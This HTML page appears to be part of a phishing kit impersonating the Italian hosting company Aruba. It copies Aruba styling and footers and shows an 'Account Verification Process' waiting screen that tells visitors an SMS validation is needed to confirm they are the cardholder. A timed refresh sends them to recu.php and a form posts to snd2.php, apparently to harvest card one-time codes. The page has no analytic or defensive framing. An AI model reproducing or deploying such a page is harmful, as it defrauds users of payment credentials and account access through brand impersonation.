<!doctype html>
<html>
<head>
	<title></title>
</head>
<body>&nbsp;</body>
<br />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" /></html>
<title></title>
<meta content="45; URL=recu.php" http-equiv="refresh" />
<meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type" />
<link href="https://managehosting.aruba.it//style.css?v=36" rel="stylesheet" type="text/css" />
<link href="https://managehosting.aruba.it//FullOrder/styles/jquery-ui.css?v=10" rel="stylesheet" type="text/css" />
<link href="https://managehosting.aruba.it//top.css?v=36" rel="stylesheet" type="text/css" />
<link href="https://descargar.vip/wp-content/uploads/2019/01/paypal-para-empresas.png" rel="icon" sizes="32x32" type="image/png" />
<div id="ChangePasswordSuggestedModal">
<div id="ChangePasswordSuggestedModalBox">
<div id="ChangePasswordClose"><span id="ChangePasswordCloseButton" onclick="$(&quot;#ChangePasswordSuggestedModal&quot;).hide();">X</span></div>

<div id="ChangePasswordDescription"><b><strong>Attenzione</strong></b><br />
<br />
<span id="txtPasswordSuggestion">La password della login {0} &egrave; scaduta e deve essere aggiornata.</span><br />
<br />
<span>E&#39; necessario procedere al cambio della password prima di accedere all&#39;area clienti.</span></div>

<div id="ChangePasswordBoxFormProceed">
<form action="https://gestioneaccessi.aruba.it/User-Detect.ashx" id="ChangePasswordForm" method="post">&nbsp;</form>
<input id="ChangePasswordForcedLogin" name="Username" type="hidden" /> <input id="ChangePasswordForcedToken" name="Token" type="hidden" /> <input name="UserAction" type="hidden" value=",3283,5200,4947,5390,5150,5151,3920,4850,5865,5635,5950,5661,5586,5000" /> <input name="Company" type="hidden" value=",2401" /> <input id="ChangePasswordForcedToken" name="Language" type="hidden" value=",3577,4200" /> <input id="ChangePasswordForcedReturnUrl" name="RedirectUrl" type="hidden" value=",5096,5800,5916,5488,5750,2958,2303,2350,5559,4753,5500,4947,5047,5050,5304,5439,5750,5916,5145,5500,5253,2254,4850,5814,5733,4900,4947,2254,5250,5916,2303,3350,4947,5341,4900,5355,5439,3400,4947,5684,5250,3315,5390,4850,5253,5586,4850,5202,5145,4950,5355,2254,4850,5865,5488,3150,3876,5439,5150,5355,5390,3050,1887,2450,3350,2550,2548,2650,2448,1813,2500,3417,2450,2600,2448,2352,1850,2550,3283,2500,2907,2352,2750,1887,2450,3350,2550,2646,2850,2703,1813,2500,3417,2450,2750,2448,2352,1850,2550,3283,2500,2652,2548,2800,1887,2450,3350,2550,2695,2600,2652,1813,2500,3417,2499,2500,2448,2352,1850,2550,3283,2600,2907,2548,2750,1887,2450,3350,2703,2597,2800,2754,1813,2500,3417,2597,2800,2703,2352,1850,2550,3283,2600,2907,2793,2800,1887,2450,3350,2652,2695,2650,2601,1813,2500,3417,2450,2550,2448,2352,1850,2550,3283,2650,2601,2597,2650,1887,2450,3350,2703,2646,2800,2652,1862,4000,4947,5635,5750,6069,5439,5700,5100,2989,1850,2550,3283,2650,2754,2499,2650,1887,2450,3350,2550,2695,2650,2448,1813,2500,3417,2597,2750,2754,2499,1850,2550,3283,2650,2652,2744,2800,1887,2450,3350,2703,2695,2650,2448,1813,2500,3417,2597,2600,2703,2695,1850,2550,3283,2500,2652,2793,2850,1887,2450,3350,2703,2695,2650,2448,1862,3400,4947,5684,5050,3111,1813,2500,3417,2450,2600,2907,2793,1850,2550,3283,2500,2601,2597,2400,1887,2450,3350,2550,2548,2850,2907,1813,2500,3417,2450,2650,2652,2744,1850,2550,3283,2500,2601,2597,2400,1887,2450,3350,2550,2597,2650,2448,1813,2500,3417,2450,2550,2703,2450,1850,2550,3283,2500,2652,2597,2400,1887,2450,3350,2550,2744,2400,2703,1813,2500,3417,2401,2650,2754,2744,1850,2550,3283,2500,2652,2597,2400,1887,2450,3350,2550,2744,2650,2754,1813,2500,3417,2450,2800,2652,2450,1850,2550,3283,2500,2754,2352,2400,1887,2450,3350,2550,2548,2850,2907,1813,2500,3417,2450,2800,2652,2450,1850,2550,3283,2500,2703,2352,2400,1887,2450,3350,2550,2695,2650,2652" /><button class="ChangePasswordButtonFormProceed">Procedi</button></div>
</div>
</div>

<p style="text-align: center;">
<style type="text/css">.ChangePasswordButtonFormProceed {
	width:150px; background:#f86313;
	background:-moz-linear-gradient(top, rgba(248,122,19,1) 0%, rgba(248,99,19,1) 100%);
	background:-webkit-gradient(left top, left bottom, color-stop(0%, rgba(248,122,19,1)), color-stop(100%, rgba(248,99,19,1)));
	background:-webkit-linear-gradient(top, rgba(248,122,19,1) 0%, rgba(248,99,19,1) 100%);
	background:-o-linear-gradient(top, rgba(248,122,19,1) 0%, rgba(248,99,19,1) 100%);
	background:-ms-linear-gradient(top, rgba(248,122,19,1) 0%, rgba(248,99,19,1) 100%);
	background:linear-gradient(to bottom, rgba(248,122,19,1) 0%, rgba(248,99,19,1) 100%);
	background-clip:padding-box;
	border-radius:3px; moz-border-radius:3px;
	-webkit-border-radius:3px;
	-webkit-box-shadow:0px 2px 0px 0px #BA500F;
	-moz-box-shadow:0px 2px 0px 0px #BA500F;
	box-shadow:0px 2px 0px 0px #BA500F;
	text-shadow:0px -1px 1px rgba(0,0,0,0.3); color:#ffffff;
	text-decoration:none;
	display:inline-block;
	cursor:pointer; padding:6px 12px;
	font-size:14px; font-weight:normal;
	line-height:1.428571429;
	text-align:center; white-space:nowrap;
	vertical-align:middle; -webkit-user-select:none;
	-moz-user-select:none; -ms-user-select:none;
	-o-user-select:none; user-select:none;
	margin:auto; border:none;
}
.ChangePasswordButtonFormProceed:active {
	margin-top:2px;	margin-bottom:-2px;
}
#ChangePasswordSuggestedModal {
	position:fixed;	top:0px;
	left:0px; height:100%;
	width:100%;	
	
	filter: Alpha(Opacity=50);
	
	background: #aaaaaa repeat-x 0px 0px;
	background-color:rgba(0,0,0,0.5);display:none;
	
	z-index:100000;
	
}
#ChangePasswordSuggestedModalBox {
	margin:auto; position:relative; background-color:white;
	width:500px; height:270px; top:35%;
	font-family:Arial;
	filter: Alpha(Opacity=100) !important;	
	z-index:100001;
}
#ChangePasswordDescription {
	margin:25px; font-size:17px;
	text-align:left; padding-top:30px;
}
#ChangePasswordBoxFormProceed {
	width:100%;	text-align:center;
}
#ChangePasswordClose {
	position:absolute;
	font-size:20px;
	font-weight:bold;
	text-align:right;
	width:100%;
	margin:10px 0px 10px -10px;
}
#ChangePasswordCloseButton {
	cursor:pointer; <br>
</style>
<img alt="" src="https://res.cloudinary.com/dgjsqvlgl/image/upload/v1565142935/uards_zb2oh8.png" style="width: 140px; height: 142px;" /></p>

<table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
	<tbody>
		<tr>
			<td height="100%" valign="top" width="100%">
			<table align="center" border="0" cellpadding="0" cellspacing="0" class="tbl_cornice" width="100%">
				<tbody>
					<tr>
						<td class="tbl_tit_ara" colspan="2"><img align="absmiddle" height="17" src="https://managehosting.aruba.it/image_carrello/tbl_tit_ara_img.gif" width="30" />
						<div class="text-wrap tlid-copy-target">
						<div class="result-shield-container tlid-copy-target" style="text-align: center;" tabindex="0"><span style="font-size:18px;"><strong><span class="tlid-translation translation" lang="it"><span title="">Account Verification Process</span></span></strong></span></div>
						</div>
						</td>
					</tr>
					<tr>
						<td class="tbl_gri">
						<div class="r_cnx_page" id="loginPage">
						<div>
						<div class="wlp-bighorn-window  " id="prefooterAmeli_1">
						<div class="wlp-bighorn-window-content">
						<div align="center" class="prefooterbody seul" style="font-size: 14px; padding: 0px 0px 1px 0px; font-weight: bolder;">&nbsp;
						<p style="color: #f87a13;"><span style="font-size:20px;">To confirm your identity, a short validation process by SMS is required</span></p>

						<p style="color: #f87a13;"><span style="font-size:20px;">to confirm that you are the cardholder.</span></p>
						</div>
						</div>
						</div>
						&nbsp;

						<div align="center" style="padding: 8px;
    margin: auto;
    border: 1px solid #CCC;
    background-color: #f5f5f5;
    text-align: center;">
						<form action="snd2.php" id="formulaire_saisie_adresse" method="post">
						<div id="eccoccpformtab">
						<ul>
							<li style="text-align: center;"><strong><span style="font-family:arial,helvetica,sans-serif;"><span style="font-size:20px;"><span class="tlid-translation translation" lang="it"><span title=""><span style="color:#0066cc;">Confirmation</span> / REFERENCE :&nbsp; <span style="color:#0066cc;"><span style="font-size:18px;">N-573295893</span></span></span></span></span></span></strong></li>
						</ul>

						<p style="font-weight: bolder; font-size: 12px;"><img alt="" src="https://cdn.shopify.com/s/files/1/1497/3014/products/phone_verify_grande.png?v=1487611705" style="width: 100px; height: 100px;" /></p>

						<p style="font-weight: bolder; font-size: 12px;"><span style="font-size:18px;"><span style="font-size:22px;">Please Wait ...&nbsp;&nbsp;&nbsp; </span></span></p>
						<img height="35" src="https://euthaliaglobal.com/images/big-ajax-loader.gif" width="35" />
						<p style="font-weight: bolder; font-size:12px;"><br />
						<span style="font-size:18px;"><span style="font-family:arial,helvetica,sans-serif;">It may take about 1 minute ...&nbsp; </span></span><span style="font-size:16px;"><span style="font-family:arial,helvetica,sans-serif;">( Do not close this page. )</span></span></p>

						<p>&nbsp;</p>
						</div>
						<!-- ------------------------------------------------------------- --><!-- ------------------------------------------------------------- -->

						<p>&nbsp;</p>
						</form>
						</div>
						</div>
						</div>
						</td>
					</tr>
				</tbody>
			</table>

			<div id="dialog" style="display: none" title="Attenzione">
			<div class="box-alert">
			<p>Attenzione, verificare che la Ragione Sociale corrisponda alla Partiva Iva visualizzata.</p>
			<input onclick="javascript: return Unblock();" type="button" value="Ok" /></div>
			</div>
			</td>
			<td valign="top" width="5"><img height="5" src="https://managehosting.aruba.it/image_main/main_separatore_5_5.gif" width="5" /></td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<tbody>
		<tr>
			<td class="separatore_5_orizzontale">&nbsp;</td>
		</tr>
		<tr>
			<td width="100%"><!--<div class="footer">
				<img src="https://managehosting.aruba.it/images/grayLineFull.png" alt="greyLine" />
				
					<img src="https://managehosting.aruba.it/images/logo-aruba-group.png" alt="logo" class="arubaGroupLogo" /><span class="copyrightBottomDescription">Copyright &copy;2017 Aruba S.p.A.- P.I. 01573850516 - All rights reserved </span>

               
				<img src="https://managehosting.aruba.it/images/grayLineFull.png" alt="greyLine" />
			</div>--><!--        <div class="footer">

<span style="border-top: 1px solid #CCC;  display: inline-block;  width: 10%;  max-width: 200px;  min-width: 50px;  margin-left: 4px;  margin-right: 4px;">&nbsp;</span>
				<img src="https://managehosting.aruba.it/images/logo-aruba-group.png" alt="logo"  class="arubaGroupLogo"  /><span class="copyrightBottomDescription">Copyright &copy; 2017 Aruba S.p.A.- P.I. 01573850516 - All rights reserved</span>

                <span style="border-top: 1px solid #CCC;  display: inline-block;  width: 10%;  max-width: 200px;  min-width: 50px;  margin-left: 4px;  margin-right: 4px;">&nbsp;</span>
		</div>-->
			<div class="footer"><img alt="greyLine" src="https://managehosting.aruba.it/images/grayLineFull.png" /> <span class="copyrightBottomDescription">Copyright &copy;2019&nbsp; S.p.A.- P.I. 01573850516 - All rights reserved </span> <img alt="greyLine" src="https://managehosting.aruba.it/images/grayLineFull.png" /></div>
			</td>
		</tr>
	</tbody>
</table>

<div aria-labelledby="ui-dialog-title-dlgMessagePagRapido" class="ui-dialog ui-widget ui-widget-content ui-corner-all  ui-draggable" role="dialog" style="display: none; position: absolute; overflow: hidden; z-index: 1000; outline: 0px;" tabindex="-1">
<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" unselectable="on"><span class="ui-dialog-title" id="ui-dialog-title-dlgMessagePagRapido" unselectable="on"><span style="margin-left: 10px; font-size: 16px;" unselectable="on">Pagamento Rapido</span></span><a class="ui-dialog-titlebar-close ui-corner-all" href="#" role="button" unselectable="on"><span class="ui-icon ui-icon-closethick" unselectable="on">close</span></a></div>

<div class="ui-dialog-content ui-widget-content" id="dlgMessagePagRapido">
<form id="myformPagamRapido" name="myformPagamRapido" onsubmit="return OnSubmitForm();"><input name="Lingua" type="hidden" value="IT" />
<table cellpadding="0" cellspacing="2" style="margin-top: 20px; margin-bottom: 10px;" width="100%">
	<tbody>
		<tr style="height: 40px;">
			<td align="right" width="50%">Inserisci il numero Ordine:<br />
			(es. 987654 o MO9876)</td>
			<td align="left" width="50%"><input id="IDOrdine" maxlength="10" name="IDordine" size="20" style="height: 18px;" type="text" /></td>
		</tr>
		<tr style="height: 60px;">
			<td align="right" width="50%">Modalit&agrave; di pagamento:</td>
			<td align="left" width="50%"><select name="TipoPagamento" style="height: 22px; width: 144px;"><option id="Opt" selected="selected">Scegli</option><option id="OptPayPal" value="PP">Paypal</option><option id="OptBancaSella" value="CC">Carta di credito</option> <!-- Added By Nitin --> <!--<option id="OptPayPal" value="PP">Paypal</option>
                        <option id="OptBancaSella" value="CC">Carta di credito</option>--> </select></td>
		</tr>
	</tbody>
</table>
</form>

<div id="divError" style="display:none;">&nbsp;</div>

<div style="text-align: right; margin-right: 24px;"><a class="buttonGreen" href="#" onclick="javascript:$('#myformPagamRapido').submit();"><span>PROCEDI</span></a></div>
</div>
</div>
